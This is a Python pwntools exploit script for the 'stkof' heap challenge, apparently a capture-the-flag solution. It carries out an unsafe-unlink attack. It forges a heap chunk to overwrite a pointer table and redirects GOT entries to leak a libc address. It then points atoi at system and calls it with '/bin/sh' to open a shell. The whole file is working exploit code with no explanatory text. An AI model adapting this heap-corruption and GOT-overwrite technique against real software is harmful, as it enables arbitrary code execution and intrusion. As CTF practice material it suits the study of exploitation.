from pwn import *
#context.log_level = 'debug'
p = process('./stkof')
e = ELF('./stkof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')


def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')


def free(idx):
    p.sendline('3')
    p.sendline(str(idx))


chunk_tab = 0x0602140
alloc(0x18)  # 1
# junk chunk

alloc(0x18)  # 2
alloc(0x80)  # 3
alloc(0x80)  # 4
fake_chunk = p64(0) + p64(0x81) + p64(chunk_tab + 0x18 + -0x18) + p64(
    chunk_tab + 0x18 - 0x10) + 'a' * 0x60 + p64(0x80)
edit(3, len(fake_chunk) + 8, fake_chunk + p64(0x90))
free(4)
payload = p64(0) + p64(e.got['free']) + p64(e.got['puts']) + p64(e.got['atoi'])
edit(3, len(payload), payload)
edit(1, 8, p64(e.plt['puts']))
#context.log_level = 'debug'
free(2)
p.recvuntil('\x0a')
libc_base = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts']
success(hex(libc_base))
edit(3, 8, p64(libc_base + libc.symbols['system']))
alloc('/bin/sh')
p.interactive()
